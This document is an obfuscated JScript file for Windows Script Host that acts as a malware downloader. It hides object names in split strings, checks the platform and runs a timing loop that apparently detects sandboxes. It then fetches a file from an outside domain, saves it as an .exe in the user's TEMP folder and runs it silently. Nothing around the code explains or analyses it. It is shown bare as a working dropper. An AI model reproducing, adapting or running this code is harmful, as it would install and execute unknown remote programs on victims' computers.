var G = false;
var HR = "Create"+"Object";
var A0 = function O() {return WScript[HR]("WScript"+".Shell");}(), D = 11;
var XN = "MSXML2"+".XMLHTTP";
var R0 = 2;
var H = R0 - 2;
function EG(UU){A0["Run"](UU, H, H);};
function A(){return XN + "";};
function X(Q, DR){H = H * 1; return Q - DR;};
function MA(){return HR;};
/*@cc_on
  @if (@_win32 || @_win64)
    G = true;
  @end
@*/
if (G)
{
var S = "";
function SS(){return 22;};
var FY = 0; var JW = 0;
function YF()
{
var SG = new this["Date"]();
var BJ = SG["getUTCMilliseconds"]();
WScript["Sleep"](SS());
var SG = new this["Date"]();
var AU = SG["getUTCMilliseconds"]();
WScript["Sleep"](SS());
var SG = new this["Date"]();
var VZ = SG["getUTCMilliseconds"]();
var FY = "O0";
FY = X(AU, BJ);
var JW = "SQ";
JW = X(VZ, AU);
S = "open";
return X(FY, JW);
}
var NW = false;
var KI = false;
for (var AB = H; AB < SS() * 1; AB++){if (YF() != H){
NW = true; 
JW = "31" + 11 * FY + JW; 
KI = true; 
break;
}}
function V() {return ((NW == true) && (NW == KI)) ? 1 : H;};
if (NW && V() && KI){
function SF() {return A0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "85l3bZ9dTJmb.ex" + "e";};
 G0 = A();
 E0 = WScript[HR](G0);
 var EY = 1;
do { 
	for (;EY;){
	try {
		if (EY == 1)
		{
			E0[S]("GET", "http://be-stlines-tore.com/k3soa", false);
			E0["send"]();
			DS = "Sleep";
			EY = 2;
		}
		WScript[DS](SS() + 120); 
		if (E0["readystate"] < 2 * 2) continue;
		EY = H;
		function R(SW) {var HB = (1, 2, 3, 4, 5, SW); return HB;};
		MD = WScript[MA()]("ADODB.Stream");
		G0 = MD;
		G0[S]();
		G0["type"] = R(1);
		G0["write"](E0["ResponseBody"]);
		MD["position"] = R(H);
		G0["Save" + "ToFile"](SF(), 2);
		MD["cl"+"ose"]();
		M = SF();
		EG(M);
	} catch(E){};};
}while (EY);
}
}

